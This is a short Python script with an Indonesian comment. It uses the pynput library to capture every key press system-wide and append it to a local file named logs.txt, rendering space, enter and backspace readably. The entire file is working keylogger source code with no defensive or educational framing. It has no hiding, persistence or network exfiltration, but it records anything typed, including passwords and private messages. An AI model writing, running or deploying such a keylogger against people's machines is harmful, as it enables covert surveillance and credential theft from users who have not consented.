import pynput
from pynput.keyboard import Listener

# ini logs nya broo
log_file = "logs.txt"

def write_to_file(key):
    with open(log_file, "a") as f:
        key_data = str(key).replace("'", "")
        if key_data == 'Key.space':
            f.write(' ')
        elif key_data == 'Key.enter':
            f.write('\n')
        elif key_data == 'Key.backspace':
            f.write('[BACKSPACE]')
        else:
            f.write(key_data)

with Listener(on_press=write_to_file) as listener:
    listener.join()
